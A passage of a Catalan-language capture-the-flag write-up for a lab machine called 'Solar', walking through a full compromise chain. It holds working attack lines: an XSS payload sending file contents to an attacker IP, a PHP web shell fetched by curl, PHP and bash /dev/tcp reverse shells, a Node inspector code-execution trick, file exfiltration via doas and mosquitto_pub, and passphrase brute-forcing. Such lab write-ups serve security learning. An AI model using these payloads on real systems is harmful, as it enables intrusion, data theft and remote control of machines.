  "solarEnergy": "<img src=x onerror=\"(async () => {location.href='http://192.168.1.116?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/?download=true&file=2024-09-03T00%3A22%3A27.568Z.json')).arrayBuffer())));})();\" />",
  "consumedEnergy": 15
}
```

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.168 - - [03/Sep/2024 02:10:55] "GET /?data=JVBERi0xLjQKMSAwIG9iago8PAovVGl0bGUgKP7/AFMAbwBsAGEAcgAgAEUAbgBlAHIAZwB5ACAA ... dGFydHhyZWYKMTk0MzEKJSVFT0YK HTTP/1.1" 200 -
```

### Pas 4

Guardem el codi base64 del PDF en un fitxer i el transformem a PDF.

```bash
$ head -c 100 base64pdf3.txt
JVBERi0xLjQKMSAwIG9iago8PAovVGl0bGUgKP7/AFMAbwBsAGEAcgAgAEUAbgBlAHIAZwB5ACAARABhAHQAYSkKL0NyZWF0b3Ig
$ cat base64pdf3.txt | base64 -d > document3.pdf
```

L'obrim i obtenim un altre codi base64, aquesta vegada del fitxer PHP carregat localment pel servidor.

![alt text](../../../assets/images/solar/image-7.png)

### Pas 5

Decodifiquem el base64 del PDF i obtenim el codi PHP següent del fitxer `/var/www/solar.nyx/records/index.php` del servidor.

```php
<?php
include("../session.php");

if (!isset($_SESSION['username']) || empty($_SESSION['username']) || $_SESSION['role'] != 'admin') {
    header("Location: /index.php");
    exit();
}
...
```

En l'execució de `wkhtmltopdf`, podem observar que només podrem llegir fitxers del servidor dins del path `/var/www/`.

```php
...
 $command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
 ...
```

## LFI

En aquest punt, es pot desenvolupar un codi en Python per facilitar el LFI. Obtenim diferents fitxers mitjançant els passos descrits anteriorment.

Els fitxers més interessants que podrem obtenir en els serveis web (enumerats al principi amb gobuster):

### /var/www/solar.nyx/login.php

On podrem obtenir les credencials de la base de dades, accessible només de forma local i de la qual hem trobat un backup.

```php
<?php
include("session.php");

$servername = "127.0.0.1";
$username = "solar_user";
$password = "lD5vkvLfMowAiaT7w64C";
$dbname = "solar_energy_db";
....
```

### /var/www/sunfriends.nyx/server.php

On podrem obtenir altres credencials molt interessants `5up3r:bloods`, que ens donen accés a un panell d'administració del servidor `https://www.sunfriends.nyx/server.php` i també podem utilitzar-les per connectar-nos al servei MQTT amb aquest usuari.

```php
<?php
$secure = true;
$httponly = true;
$samesite = 'Strict';
$secret = [
    'user' => '5up3r',
    'pass' => 'bloods'
];

if (PHP_VERSION_ID < 70300) {
    session_set_cookie_params($maxlifetime, '/; samesite=' . $samesite, $_SERVER['HTTP_HOST'], $secure, $httponly);
} else {
    session_set_cookie_params([
        'lifetime' => $maxlifetime,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'],
        'secure' => $secure,
        'httponly' => $httponly,
        'samesite' => $samesite
    ]);
}
...
```
![Admin Login](../../../assets/images/solar/image-8.png)

## RCE

Analitzant el codi font de `/var/www/sunfriends.nyx/server.php`, observem que les credencials de l'usuari s'utilitzen per a la validació del formulari i per a la connexió al servei MQTT.

![Server Administration Panel](../../../assets/images/solar/image-10.png)

Accedim a `https://www.sunfriends.nyx/server.php` amb les credencials obtingudes `5up3r:bloods`, també ens connectem al servidor MQTT amb les mateixes credencials i ens subscrivim a tots els topics `#`.

![MQTTX Config](../../../assets/images/solar/image-5.png)

Podem observar que obtenim tots els missatges dels topics `data` i `record`, i quan executem una comanda també del topic `server/command/output`.

![alt text](../../../assets/images/solar/image-11.png)

Intentem publicar dades en diferents topics com `server/command/info`, `server/command/add`, `server/command/new`, ... i quan publiquem en **server/command/new**, rebem un missatge que no hem enviat en el topic `server/command/error`.

![command](../../../assets/images/solar/image-28.png)

Afegim el paràmetre **name** al JSON enviat al topic `server/command/new`.

![command2](../../../assets/images/solar/image-29.png)

També afegim el paràmetre `cmd` i ja no rebem cap error.

En la programació de `/server.php` veiem que la comanda és filtrada per la funció `escapeshellcmd` de PHP. Segons el manual de PHP, aquesta funció...

```text
Els següents caràcters són precedits per una barra invertida: #&;`|*?~<>^()[]{}$\, \x0A i \xFF. ' i " són escapats únicament si no estan emparellats.
```

Preparem un fitxer PHP i aixequem un servei al port 8000.

```bash
echo '<?php echo(exec($_GET["cmd"])); ?>' > shell.php
python3 -m http.server 8000
```

i enviem el següent payload en el topic `server/command/new` per pujar el fitxer `shell.php` (creat anteriorment) a la carpeta `/var/www/solar.nyx/records/`, ja que altres carpetes no ens funcionen i vam veure que un script PHP (`/var/www/solar.nyx/records/index.php`) esborra fitxers en aquesta carpeta.

```json
{
  "name": "upload-revshell",
  "cmd": "curl -o /var/www/solar.nyx/records/shell.php http://192.168.1.116:8000/shell.php"
}
```

Executem la comanda `upload-revshell` des de la pàgina `https://www.sunfriends.nyx/server.php` i observem com es descarrega el `shell.php` preparat.

```bash
nc -lvnp 12345
```

Enviem el següent `revshell` a través del paràmetre `cmd` URL encodejat.

```bash
php -r '$sock=fsockopen("192.168.1.116",12345);exec("/bin/bash <&3 >&3 2>&3");'
```

```
https://www.solar.nyx/records/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.116%22%2C12345%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

Ja tenim `shell` amb `www-data`.

![alt text](../../../assets/images/solar/image-13.png)

## www-data a Lenam

Fem el tractament de la TTY.

```bash
$ cat /etc/passwd|grep sh
root:x:0:0:root:/root:/bin/bash
lenam:x:1000:1000:,,,:/home/lenam:/bin/bash
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
julian:x:1001:1001::/home/julian:/bin/sh

$ cat /etc/doas.conf
permit nopass www-data as lenam cmd /usr/bin/mosquitto_pub
permit lenam as julian cmd /bin/kill
permit setenv { PATH } julian as root cmd /usr/local/bin/backups

```

Podem executar `mosquitto_pub` com l'usuari `lenam` mitjançant `doas` sense contrasenya.

### Obtenir `user.txt` i `id_ed25519` de lenam

Trobem la flag `/home/lenam/user.txt` i també algunes claus SSH. Ens subscrivim al topic `filtrate` al client MQTT i executem els següents comandaments.

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/user.txt
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.ssh/id_ed25519
```
![alt text](../../../assets/images/solar/image-14.png)

La clau està encriptada i el `passphrase` és fort; no està en `rockyou.txt`.

### Obtenir `passphrase` del `id_ed25519` de lenam

Creem un fitxer i una carpeta....

```bash
www-data@solar:/tmp$ ls -l
total 4
-rw-r--r-- 1 www-data www-data    0 Aug 27 17:12 file
drwxr-xr-x 2 www-data www-data 4096 Aug 27 17:11 folder
```

Amb el paràmetre `-f` de `mosquitto_pub`, podem identificar si no existeix:

```bash
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./filenoexist
Error: Unable to open file "./filenoexist".
Error loading input file "./filenoexist".
```

Si el fitxer existeix (fins i tot enviar-lo a un `topic`),

```bash
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./file
Error: Both topic and message must be supplied.
mosquitto_pub is a simple mqtt client that will publish a message on a single topic and exit.
mosquitto_pub version 2.0.11 running on libmosquitto 2.0.11.

Usage: mosquitto_pub {[-h host] [--unix path] [-p port] [-u username] [-P password] -t topic | -L URL}
                     {-f file | -l | -n | -m message}
                     [-c] [-k keepalive] [-q qos] [-r] [--repeat N] [--repeat-delay time] [-x session-expiry]
                     [-A bind_address] [--nodelay]
                     [-i id] [-I id_prefix]
                     [-d] [--quiet]
                     [-M max_inflight]
                     [-u username [-P password]]
                     [--will-topic [--will-payload payload] [--will-qos qos] [--will-retain]]
                     [{--cafile file | --capath dir} [--cert file] [--key file]
                       [--ciphers ciphers] [--insecure]
                       [--tls-alpn protocol]
                       [--tls-engine engine] [--keyform keyform] [--tls-engine-kpass-sha1]]
                       [--tls-use-os-certs]
                     [--psk hex-key --psk-identity identity [--ciphers ciphers]]
                     [--proxy socks-url]
                     [--property command identifier value]
                     [-D command identifier value]
       mosquitto_pub --help
      ...
```

O si és una carpeta:

```bash
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./folder
Error: File must be less than 268435455 bytes.

Error loading input file "./folder".

www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./filenoexist 2>&1 | wc -l
2
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./file 2>&1 | wc -l
97
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./folder 2>&1 | wc -l
3
```

Estem davant un sistema Debian 12.

```bash
$ cat /etc/debian_version
12.7
```

Creem un diccionari dels dotfiles més comuns a Debian des de la URL https://wiki.debian.org/DotFilesList.

```bash
www-data@solar:/tmp$ curl https://wiki.debian.org/DotFilesList 2> /dev/null | grep -oP '(?<=\<tt class="backtick">).*?(?=</tt>)' | sort | uniq  > dotfiles.txt
```

i busquem si hi ha algun fitxer de la llista dins del home de lenam que puguem obtenir.

```bash
www-data@solar:/tmp$ cat ./dotfiles.txt | tr '\n' '\0' | xargs -0 -I {} -P 50 bash -c '
    result=$(doas -u lenam /usr/bin/mosquitto_pub -f "/home/lenam/.local/nano/{}" 2>&1 | wc -l)
    if [ "$result" -eq 3 ]; then
        echo "** Folder {} $(ls -dlah {} 2>/dev/null)"
    elif [ "$result" -eq 97 ]; then
        echo "** File {} $(ls -lah {} 2>/dev/null)"
    fi
'
** File .bash_logout
** File .bash_history
** File .bashrc
** Folder .gnupg/
** File .lesshst
** Folder .local/
** File .nanorc
** File .ssh/authorized_keys
```

Trobem les carpetes `.gnupg/` i `.local/` on podem tornar a passar l'escàner improvisat. També utilitzem altres diccionaris trobats per internet, modificant-los si cal.

- https://github.com/bhavesh-pardhi/Wordlist-Hub/blob/main/WordLists/dotfiles.txt
- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

Trobem el passphrase del `id_ed25519` de l'usuari lenam filtrat a l'historial de cerques de l'editor nano al fitxer `/home/lenam/.local/share/nano/search_history`.

L'enviem al servidor MQTT:

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.local/share/nano/search_history
```

![Passphrase filtrat](../../../assets/images/solar/image-15.png)

Entrem amb la clau SSH de l'usuari lenam i el passphrase `CzMO48xpwof8nvQ6JUhF` per SSH.

![SSH Lenam](../../../assets/images/solar/image-16.png)

## De lenam a julian

L'usuari lenam pot matar processos com l'usuari julian mitjançant la seva contrasenya, que no tenim.

```bash
lenam@solar:~$ cat /etc/doas.conf
permit nopass www-data as lenam cmd /usr/bin/mosquitto_pub
permit lenam as julian cmd /bin/kill
permit setenv { PATH } julian as root cmd /usr/local/bin/backups

```

Trobem la carpeta `/home/lenam/.password-store` on se solen emmagatzemar les contrasenyes de `pass`, un gestor de contrasenyes.

![pass test](../../../assets/images/solar/image-17.png)

Podem veure que l'usuari lenam l'utilitza i té emmagatzemades diverses contrasenyes. No les podem veure perquè ens demana un passphrase per visualitzar-les. No serveix el passphrase que tenim de la clau utilitzada en l'SSH. Normalment, aquest programari utilitza una clau GPG per protegir el vault.

Trobem 2 claus GPG a la carpeta `/home/lenam/.gnupg/private-keys-v1.d/`.

![alt text](../../../assets/images/solar/image-18.png)

### Cracking GPG 2.2

```bash
lenam@solar:~$ gpg --version
gpg (GnuPG) 2.2.40
libgcrypt 1.10.1
Copyright (C) 2022 g10 Code GmbH
License GNU GPL-3.0-or-later <https://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Home: /home/lenam/.gnupg
Supported algorithms:
Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
        CAMELLIA128, CAMELLIA192, CAMELLIA256
Hash: SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
Compression: Uncompressed, ZIP, ZLIB, BZIP2

lenam@solar:~$ pass
Password Store
├── personal
│   ├── private_id
│   └── user
└── work
    └── office
```

Ens trobem amb una versió GPG 2.2 amb GnuPG, on ha canviat el nou format de fitxers i no són compatibles amb `hashcat`, `john` o `gpg2john`. No podem o sabem exportar-la a una versió antiga sense tenir el passphrase de la clau privada GPG.

```bash
lenam@solar:~$ find .password-store/
.password-store/
.password-store/.gpg-id
.password-store/personal
.password-store/personal/user.gpg
.password-store/personal/private_id.gpg
.password-store/work
.password-store/work/office.gpg
lenam@solar:~$ find .gnupg/
.gnupg/
.gnupg/pubring.kbx
.gnupg/random_seed
.gnupg/gpg-agent.conf
.gnupg/trustdb.gpg
.gnupg/.#lk0x000055afe4c8a3f0.solar.309336
.gnupg/openpgp-revocs.d
.gnupg/openpgp-revocs.d/E6DB2B029F01725397A555CD6CE6C909C038D50C.rev
.gnupg/pubring.kbx~
.gnupg/private-keys-v1.d
.gnupg/private-keys-v1.d/C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95.key
.gnupg/private-keys-v1.d/18DB29FBB15652340964CF0E1C710F34AA848ADD.key
```

Trobem dos fitxers de claus privades i diferents contrasenyes encriptades pel gestor de contrasenyes `pass` i emmagatzemades a `.password-store`.

```bash
lenam@solar:~$ gpg --list-keys --with-keygrip
/home/lenam/.gnupg/pubring.kbx
------------------------------
pub   rsa3072 2024-08-29 [SC]
      E6DB2B029F01725397A555CD6CE6C909C038D50C
      Keygrip = 18DB29FBB15652340964CF0E1C710F34AA848ADD
uid           [ultimate] secret <lenam@solar.nyx>
sub   rsa3072 2024-08-29 [E]
      Keygrip = C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95

lenam@solar:~$ gpg --list-secret-keys --with-keygrip
/home/lenam/.gnupg/pubring.kbx
------------------------------
sec   rsa3072 2024-08-29 [SC]
      E6DB2B029F01725397A555CD6CE6C909C038D50C
      Keygrip = 18DB29FBB15652340964CF0E1C710F34AA848ADD
uid           [ultimate] secret <lenam@solar.nyx>
ssb   rsa3072 2024-08-29 [E]
      Keygrip = C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95

lenam@solar:~$ gpgconf --list-components
gpg:OpenPGP:/usr/bin/gpg
gpgsm:S/MIME:/usr/bin/gpgsm
gpg-agent:Private Keys:/usr/bin/gpg-agent
scdaemon:Smartcards:/usr/lib/gnupg/scdaemon
dirmngr:Network:/usr/bin/dirmngr
pinentry:Passphrase Entry:/usr/bin/pinentry
```

Veiem una clau GPG que pertany a l'usuari "secret" amb el correu electrònic lenam@solar.nyx. La clau principal s'utilitza per signar i certificar [SC], mentre que la clau subordinada s'utilitza per xifrar [E] dades. Totes dues claus no caduquen mai.
La petjada digital (fingerprint) de la clau és `E6DB2B029F01725397A555CD6CE6C909C038D50C`.

El xifrat RSA de 3072 bits és un xifrat molt fort i serà difícil de crackejar per força bruta.

També trobem un fitxer amb una nota.

```bash
lenam@solar:~$ cat note.txt
You just have to remember the one that starts with love and ends with a number.
```

Copiem les carpetes `.gnupg` a la home de l'usuari de la nostra màquina (Compte aquí si ja teniu aquestes carpetes; feu una còpia abans per no perdre les vostres claus GPG) i també ens copiem la carpeta `.password-store`.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ scp -ri id_ed25519_lenam lenam@192.168.1.168:~/.password-store .
Enter passphrase for key 'id_ed25519_lenam':
.gpg-id                                                  100%    7     1.8KB/s   00:00
user.gpg                                                 100%  471   168.5KB/s   00:00
private_id.gpg                                           100%  471    93.7KB/s   00:00
office.gpg                                               100%  463   108.3KB/s   00:00

┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ scp -ri id_ed25519_lenam lenam@192.168.1.168:~/.gnupg ~/
Enter passphrase for key 'id_ed25519_lenam':
tofu.db                                                  100%   48KB   6.9MB/s   00:00
pubring.kbx                                              100% 1954   562.6KB/s   00:00
random_seed                                              100%  600   154.7KB/s   00:00
gpg-agent.conf                                           100%   36     9.3KB/s   00:00
trustdb.gpg                                              100% 1280   442.1KB/s   00:00
.#lk0x

000055afe4c8a3f0.solar.309336                      100%   17     5.5KB/s   00:00
E6DB2B029F01725397A555CD6CE6C909C038D50C.rev             100% 1626   528.3KB/s   00:00
pubring.k

bx~                                             100% 1960   713.3KB/s   00:00
C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95.key             100% 3105     1.9MB/s   00:00
18DB29FBB15652340964CF0E1C710F34AA848ADD.key             100% 3105     1.7MB/s   00:00
```

Utilitzant rockyou i filtrant les contrasenyes que comencen per "love" i acaben en un número, intentem obtenir el passphrase utilitzat per encriptar la clau GPG amb el següent script bash.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ time grep -E '^love.*[0-9]$' /usr/share/wordlists/rockyou.txt | xargs -P 4 -I {} sh -c 'echo "Testing passphrase: {} ..."; gpg --batch --yes --passphrase "{}" --pinentry-mode loopback --decrypt .password-store/work/office.gpg 2>/dev/null && echo "** Passphrase found: {}" && killall xargs'
Testing passphrase: love123 ...
Testing passphrase: love12 ...
Testing passphrase: loveme1 ...
Testing passphrase: lovely1 ...
Testing passphrase: lover1 ...
...
Testing passphrase: love27 ...
Testing passphrase: lovers2 ...
Testing passphrase: loverboy1 ...
Testing passphrase: love55 ...
Testing passphrase: love77 ...
Testing passphrase: love45 ...
d1NpIh1bCKMx
** Passphrase found: loverboy1
zsh: broken pipe  grep --color=auto -E '^love.*[0-9]$' /usr/share/wordlists/rockyou.txt |
zsh: terminated   xargs -P 4 -I {} sh -c

real    21,11s
user    0,05s
sys     0,00s
cpu     0%

real    21,11s
user    0,16s
sys     0,02s
cpu     0%
```

En uns 21 segons obtenim el passphrase de la clau GPG `loverboy1` i les dades encriptades de `.password-store/work/office.gpg` `d1NpIh1bCKMx`, tot i que aquesta contrasenya no ens servirà. Ara podem visualitzar la resta de contrasenyes al gestor `pass`.

### Node

Ara que ja tenim el passphrase (`loverboy1`) del gestor, podem obtenir totes les contrasenyes.

```bash
lenam@solar:~$ pass
Password Store
├── personal
│   ├── private_id
│   └── user
└── work
    └── office
lenam@solar:~$ pass personal/private_id
CzMO48xpwof8nvQ6JUhF
lenam@solar:~$ pass personal/user
qiFQI7buDp7zIQnAymEY
lenam@solar:~$ pass work/office
d1NpIh1bCKMx
```

La contrasenya `personal/private_id` és el passphrase de la clau SSH que ja tenim; `personal/user` és la contrasenya de l'usuari `lenam`, necessària per a l'execució de `doas`. L'última contrasenya `work/office` no la necessitarem.

Ara que tenim la contrasenya de `lenam`, podem matar processos com l'usuari `julian` mitjançant `doas`.

```text
permit lenam as julian cmd /bin/kill
```

Busquem processos que tingui oberts l'usuari `julian`.

```bash
lenam@solar:~$ ps aux | grep julian
julian    549542  3.2  3.9 1053996 79168 ?       Ssl  05:11   0:00 /home/julian/.nvm/versions/node/v22.7.0/bin/node /home/julian/.local/bin/demoadm/login.js
julian    549553  5.0  8.8 34100228 179060 ?     Ssl  05:11   0:00 /home/julian/.cache/puppeteer/chrome/linux-126.0.6478.126/chrome-linux64/chrome --allow-pre-commit-input --disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-hang-monitor --disable-infobars --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-search-engine-choice-screen --disable-sync --enable-automation --export-tagged-pdf --generate-pdf-document-outline --force-color-profile=srgb --metrics-recording-only --no-first-run --password-store=basic --use-mock-keychain --disable-features=Translate,AcceptCHFrame,MediaRouter,OptimizationHints,ProcessPerSiteUpToMainFrameThreshold,IsolateSandboxedIframes --enable-features=PdfOopif --headless=new --hide-scrollbars --mute-audio about:blank --ignore-certificate-errors --remote-debugging-port=0 --user-data-dir=/tmp/puppeteer_dev_chrome_profile-W1SxUQ
...
```

Trobem un procés que executa `nodejs`. Aquest procés es reinicia cada 2 minuts, canviant el seu PID.

Podem intentar matar el procés enviant un senyal `SIGUSR1`; això reiniciarà el procés de `nodejs` amb el port de l'inspector obert per defecte al port `9229`.

Verifiquem si podem executar el binari de `nodejs` que està al servidor i si tenim permisos d'execució.

```bash
lenam@solar:~$ /home/julian/.nvm/versions/node/v22.7.0/bin/node --version
v22.7.0
```

Matem el procés i, a continuació, intentem entrar amb l'inspector de `nodejs`.

```bash
lenam@solar:~$ doas -u julian /bin/kill -s SIGUSR1 $(pgrep "node") && /home/julian/.nvm/versions/node/v22.7.0/bin/node inspect localhost:9229
doas (lenam@solar) password:
connecting to localhost:9229 ... ok
debug>
```

Podem entrar a l'inspector i enviar comandes al procés de l'aplicació mitjançant `exec()`. Això funcionarà durant un temps fins que el procés sigui reiniciat (aproximadament cada 2 minuts); després, haurem de sortir de l'inspector amb `.exit`.

Ens posem a escoltar amb `netcat` a la nostra màquina.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ nc -lvnp 5000
listening on [any] 5000 ...
```

Al servidor, executem la comanda anterior per entrar a l'inspector de `nodejs`.

```bash
lenam@solar:~$ doas -u julian /bin/kill -s SIGUSR1 $(pgrep "node") && /home/julian/.nvm/versions/node/v22.7.0/bin/node inspect localhost:9229
doas (lenam@solar) password:
connecting to localhost:9229 ... ok
debug>
```

Ràpidament, sense esperar molt de temps, introduïm al depurador:

```javascript
debug> exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/192.168.1.116/5000 0>&1\"')")
```

Obtenim una `revshell` amb l'usuari `julian`.

![revshell julian](../../../assets/images/solar/image-19.png)

## De julian a root

Fem el tractament de la TTY.

```bash
julian@solar:/$ cat /etc/doas.conf
permit nopass www-data as lenam cmd /usr/bin/mosquitto_pub
permit lenam as julian cmd /bin/kill
permit setenv { PATH } julian as root cmd /usr/local/bin/backups

```

L'usuari `julian` pot executar el binari `/usr/local/bin/backups` com a `root`, conservant la variable d'entorn `PATH`, però necessitem la contrasenya de l'usuari.

### Contrasenya de julian

Trobem una imatge JPG a la carpeta de l'usuari. La portem a la nostra màquina mitjançant `curl` i el mòdul de Python `uploadserver`.

![uploadserver](../../../assets/images/solar/image-20.png)

Amb `stegcracker` i `rockyou.txt`, en pocs segons descobrim la contrasenya `teresa` i extraiem la informació.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ stegcracker my-pass.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2024 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which
will blast through the rockyou.txt wordlist within 1.9 second as opposed
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'my-pass.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: teresa
Tried 851 passwords
Your file has been written to: my-pass.jpg.out
teresa

┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ cat my-pass.jpg.out
Password programmed

D'`r^9K=m54z8ywSeQcPq`M',+lZ(XhCC{@b~}<*)Lrq7utmrqji/mfN+ihgfe^F\"C_^]\[Tx;WPOTMqp3INGLKDhHA@d'CB;:9]=<;:3y76/S321q/.-,%Ij"'&}C{c!x>|^zyr8vuWmrqjoh.fkjchgf_^$\[ZY}W\UTx;WPOTSLp3INMLEJCg*@dDC%A@?8\}5Yzy1054-,P*)('&J$)(!~}C{zy~w=^zsxwpun4rqjih.leMiba`&^F\"CB^]Vzg

```

Apareix la frase `Password programmed` i després:

```text
D'`r^9K=m54z8ywSeQcPq`M',+lZ(XhCC{@b~}<*)Lrq7utmrqji/mfN+ihgfe^F\"C_^]\[Tx;WPOTMqp3INGLKDhHA@d'CB;:9]=<;:3y76/S321q/.-,%Ij"'&}C{c!x>|^zyr8vuWmrqjoh.fkjchgf_^$\[ZY}W\UTx;WPOTSLp3INMLEJCg*@dDC%A@?8\}5Yzy1054-,P*)('&J$)(!~}C{zy~w=^zsxwpun4rqjih.leMiba`&^F\"CB^]Vzg
```

Si busquem entre llenguatges de programació difícils d'entendre, trobem `Malbolge`, un llenguatge de programació complicat, desenvolupat així a propòsit pel seu creador.

Hi ha diferents llocs web on podem executar `Malbolge` en línia; nosaltres utilitzem:

https://malbolge.doleczek.pl/

Copiem el text del programa `Malbolge` trobat a la imatge i l'executem.

![julian password](../../../assets/images/solar/image-21.png)

Trobem la contrasenya de l'usuari `julian`: `tk8QaHUi3XaMLYoP1BpZ`.

```bash
julian@solar:~$ doas /usr/local/bin/backups
doas (julian@solar) password: 
Usage: /usr/local/bin/backups <database_name>
julian@solar:~$ 
```

### Binari backups

Analitzem el binari `/usr/local/bin/backups` que ara podem executar com l'usuari `root`.

```bash
julian@solar:~$ doas /usr/local/bin/backups
doas (julian@solar) password:
Usage: /usr/local/bin/backups <database_name>

julian@solar:~$ doas /usr/local/bin/backups test
doas (julian@solar) password:
mysqldump: Got error: 1049: "Unknown database 'test'" when selecting the database
Error executing mysqldump and gzip. Exit code: 512

julian@solar:~$ doas /usr/local/bin/backups --help
doas (julian@solar) password:
Invalid database name. Ensure it contains only letters, numbers, and underscores, and is between 1 and 64 characters long.

julian@solar:~$ doas /usr/local/bin/backups solar_energy_db
doas (julian@solar) password:
Backup completed successfully: /var/www/sunfriends.nyx/database.sql.gz

```

Sembla ser un binari encarregat de fer la còpia de seguretat que hem trobat a l'inici d'aquest writeup. No sembla ser vulnerable a un desbordament de memòria intermèdia (buffer overflow). Mirem si té biblioteques que puguem suplantar amb `ldd`.

```bash
julian@solar:~$ ldd /usr/local/bin/backups
        linux-vdso.so.1 (0x00007ffe26ffc000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1665b82000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f1665d71000)
```

```bash
julian@solar:~$ readelf -d /usr/local/bin/backups

Dynamic section at offset 0x2de0 contains 26 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x1000
 0x000000000000000d (FINI)               0x14f0
 0x0000000000000019 (INIT_ARRAY)         0x3dd0
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x3dd8
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3a0
 0x0000000000000005 (STRTAB)             0x560
 0x0000000000000006 (SYMTAB)             0x3c8
 0x000000000000000a (STRSZ)              244 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x3fe8
 0x0000000000000002 (PLTRELSZ)           240 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x7a0
 0x0000000000000007 (RELA)               0x6c8
 0x0000000000000008 (RELASZ)             216 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffb (FLAGS_1)            Flags: PIE
 0x000000006ffffffe (VERNEED)            0x678
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x654
 0x000000006ffffff9 (RELACOUNT)          3
 0x0000000000000000 (NULL)               0x0
```

Amb `strings`, intentem entendre una mica més.

```bash
julian@solar:~$ strings /usr/local/bin/backups
/lib64/ld-linux-x86-64.so.2
dlclose
strlen
__ctype_b_loc
__libc_start_main
stderr
fprintf
dlsym
dlopen
__cxa_finalize
dlerror
__isoc99_sscanf
fwrite
libc.so.6
GLIBC_2.3
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
%2hhx
Usage: %s <database_name>
Invalid database name. Ensure it contains only letters, numbers, and underscores, and is between 1 and 64 characters long.
/var/www/sunfriends.nyx/database.sql.gz
05000b0b080a021c19471a06
Error loading library.
0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19
Error finding symbol.
Backup completed successfully: %s

...
```
Podem observar `dlclose`, `dlopen`, ... que s'utilitzen per a la càrrega de llibreries dinàmiques. També trobem dos textos sospitosos de carregar llibreries de forma dinàmica, precedits de codis en hexadecimal.

```text
05000b0b080a021c19471a06
Error loading library.
0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19
Error finding symbol.
```

Ens dirigim a [CyberChef](https://gchq.github.io/CyberChef/) i utilitzem la `Recipe` `Magic`, activant `Intensive mode` i `Extensive language support`. Peguem el primer codi `05000b0b080a021c19471a06`.

Després d'una estona calculant, CyberChef fa màgia i descobreix que està codificat en hexadecimal i després en XOR amb la clau `69`.

![CyberChef 1](../../../assets/images/solar/image-22.png)

Ens descobreix el nom d'una llibreria `libbackup.so`. Fem el mateix amb l'altre codi més llarg `0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19`, que està codificat de la mateixa manera amb la mateixa clau XOR.

![CyberChef 2](../../../assets/images/solar/image-23.png)

Ja tenim el nom d'una llibreria `libbackup.so` i el que sembla ser el nom d'una funció `create_compressed_backup`.

Podríem portar el fitxer a la nostra màquina i utilitzar `uftrace`, però no ho veiem necessari.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
